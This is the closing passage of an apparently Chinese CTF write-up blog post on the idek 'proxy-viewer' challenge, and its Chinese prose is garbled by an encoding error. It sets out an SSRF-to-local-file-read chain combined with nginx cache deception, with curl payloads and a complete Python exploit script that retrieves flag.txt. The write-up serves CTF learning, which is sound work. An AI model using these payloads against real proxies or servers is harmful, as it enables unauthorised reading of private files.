<p>æ‰€ä»¥nginxå°†<code>http://127.0.0.1:1337/proxy/file%3a///flag.txt%2523/../../../static/a</code>ç»è¿‡è§„èŒƒåŒ–å¤„ç†åä¼šå¾—åˆ°<code>http://127.0.0.1/static/a</code></p>
<p>è¿™æ ·å°±ä¼šè¯»å–flag.txtçš„å†…å®¹ï¼Œå¹¶è¢«nginxä¿å­˜åœ¨ç¼“å­˜ä¸­</p>
<p>è€Œä¸”å†ä¸€æ¬¡è®¿é—®è¿™ä¸ªurlçš„æ—¶å€™ï¼Œå°±ä¼šè¯»å–è¯»å–è¿™ä¸ªç¼“å­˜ï¼Œç„¶åå¾—åˆ°flag</p>
<p>ä½¿ç”¨hackbaræˆ–è€…burpsuitå¯èƒ½ä¼šé€ æˆä¸€äº›é—®é¢˜ï¼Œå¯¼è‡´ä¸èƒ½æˆåŠŸï¼Œæ‰€ä»¥ä½¿ç”¨curlæˆ–è€…pythonè¿›è¡Œæ‰“payload</p>
<pre><code class="bash">$ curl --path-as-is http://localhost:1337/proxy/http://127.0.0.1:1337/proxy/file%3a///flag.txt%2523/../../../static/asdf
$ curl --path-as-is http://localhost:1337/proxy/file:///flag.txt%23/../../../static/asdf | grep &quot;idek&#123;.*&#125;&quot;
</code></pre>
<h2 id="0x03-downgradeå¤§å“¥çš„wpå’Œexp"><a href="#0x03-downgradeå¤§å“¥çš„wpå’Œexp" class="headerlink" title="0x03 downgradeå¤§å“¥çš„wpå’Œexp"></a>0x03 downgradeå¤§å“¥çš„wpå’Œexp</h2><p>ideké‡Œçš„è€å¤§å“¥:<a target="_blank" rel="noopener" href="https://downgraded.github.io/">https://downgraded.github.io/</a></p>
<pre><code>tl;dr: SSRF -&gt; local file read -&gt; cache deception

nginx will cache anything if the path starts with /static

if we take http://proxy-viewer/proxy/test/../../static/a:

flask will see test/../../static/a as the path parameter, but nginx does not know this context and will normalize the ../s such that it thinks the path starts with /static

urlopen will stop reading a filename at #, so something like /etc/passwd#asdf will read /etc/passwd

so to put it together we first send this link:

https://proxy-viewer-5366bdc77ddd5710.instancer.idek.team/proxy/http://127.0.0.1:1337/proxy/file%3a///flag.txt%2523/../../../static/a

this will submit a request to read the flag from localhost, and store it in the cache

then, access the same SSRF&#39;d url and read the cached response: https://proxy-viewer-5366bdc77ddd5710.instancer.idek.team/proxy/file:///flag.txt%23/../../../static/a
</code></pre>
<p>exp</p>
<pre><code class="python">import requests
import string, random
import re

# generate random string for unique caching
cachebuster = &quot;&quot;.join([random.choice(string.ascii_letters) for i in range(10)])

# nginx url
base_url = &quot;http://localhost:1337&quot;

s = requests.Session()

proxies = &#123;&quot;https&quot;: &quot;http://127.0.0.1:8080&quot;&#125;
#s.proxies.update(proxies)

# store file in nginx cache
url = f&quot;&#123;base_url&#125;/proxy/http://127.0.0.1:1337/proxy/file%3a///flag.txt%2523/../../../static/&#123;cachebuster&#125;&quot;
req = requests.Request(method=&#39;GET&#39;, url=url)
prep = req.prepare()
prep.url = url
s.send(prep, verify=False)

# view cached file
url = f&quot;&#123;base_url&#125;/proxy/file:///flag.txt%23/../../../static/&#123;cachebuster&#125;&quot;
req = requests.Request(method=&#39;GET&#39;, url=url)
prep = req.prepare()
prep.url = url
r = s.send(prep, verify=False)

flag = re.findall(&quot;idek&#123;.*&#125;&quot;, r.text)

print(flag)
</code></pre>

    </div>

    <div class="post-meta">
        <i>
        
            <span>2023-07-03</span>
            
                <span>è¯¥ç¯‡æ–‡ç« è¢« v2ish1yan</span>
            
            
                <span>æ‰“ä¸Šæ ‡ç­¾:
                    
                    
                        <a href='/tags/php/'>
                            php
                        </a>
                    
                        <a href='/tags/go/'>
                            go
                        </a>
                    
                        <a href='/tags/flask/'>
                            flask
                        </a>
                    
                </span>
             
             
                <span>å½’ä¸ºåˆ†ç±»:
                    
                    
                        <a href='/categories/WP/'>
                            WP
                        </a>
                    
                </span>
            
        
        </i>
    </div>
    
        
    <div class="comments-container">
    <div id="comment-anchor"></div>
    <div class="comment-area-title">
         
    </div>
    
        

    <div id="waline"></div>
    <script type="module"  >
        import { init } from 'https://npm.elemecdn.com/hexo-theme-a4@latest/source/js/waline.mjs'; 
        function loadWaline() {
            init({
                el: '#waline',
                serverURL: 'https://a4-talk.vercel.app',
                lang: 'zh-CN',
                dark: 'body[class~="dark-mode"]',
                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
                search: false, // ç¦æ­¢è¡¨æƒ…åŒ…æœç´¢
                reaction: false, // å¯¹æ–‡ç« æ‰“åˆ†
                pageview: false, // æµè§ˆé‡ç»Ÿè®¡
                comment: false, // è¯„è®ºæ•°ç»Ÿè®¡

                locale: {
                    placeholder: 'æ¬¢è¿è¯„è®º', 
                    sofa: ''
                },
            });
            
        }
        window.addEventListener('DOMContentLoaded', loadWaline);
    </script>



    
    
    
    </div>


     
</div>



                                      
                    
                    
                    <div class="footer">
    
        <span> 
            Â© 1949-2024 China 

            
                

            
        </span>
    
</div>
<!--è¿™æ˜¯æŒ‡ä¸€æ¡çº¿å¾€ä¸‹çš„å†…å®¹-->
<div class="footer-last">
    
            <span>ğŸŒŠé¢æœå¤§æµ·ï¼Œæ˜¥æš–èŠ±å¼€ğŸŒ¸</span>
            
                <span class="footer-last-span-right"><i>æœ¬ç«™ç”±<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>é©±åŠ¨ï½œä½¿ç”¨<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>ä¸»é¢˜</i></span>
            
    
</div>


   
    
<script src="/js/highlight.min.js"></script>

    
<script src="/js/highlightjs-line-numbers.js"></script>


    
<script src="/js/randomHeaderContent.js"></script>

    <!--å›åˆ°é¡¶éƒ¨æŒ‰é’®-->
    
        
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>

        
<script src="/js/returnToTop.js"></script>

    

    <!--ç›®å½•-->
    
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
        
<script src="/js/toc.js"></script>

    



<script>
    hljs.initHighlightingOnLoad();
    hljs.initLineNumbersOnLoad();
</script>



                </div>
            
            
                <!-- å›åˆ°é¡¶éƒ¨çš„æŒ‰é’®-->  
                <div class="progress-wrap shadow-drop-2-bottom">
                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
                    </svg>
                </div>
            
    </body>


    <!--æš—é»‘æ¨¡å¼-->
    <script src="/js/darkmode-js.min.js"></script>
    <script>
        function addDarkmodeWidget() {
        const options = {
            bottom: '53px', // default: '32px'
            right: 'unset', // default: '32px'
            left: '42px', // default: 'unset'
            time: '0.3s', // default: '0.3s'
            mixColor: '#fff', // default: '#fff'
            backgroundColor: ' #e4e4e4  ',  // default: '#fff'
            buttonColorDark: '#100f2c',  // default: '#100f2c'
            buttonColorLight: '#fff', // default: '#fff'
            saveInCookies: true, // default: true,
            label: 'ğŸŒ“', // default: ''
            autoMatchOsTheme: true // default: true
        }
    
        const darkmode = new Darkmode(options);
        darkmode.showWidget();
        
        }
        window.addEventListener('load', addDarkmodeWidget);
    </script>
  
</html>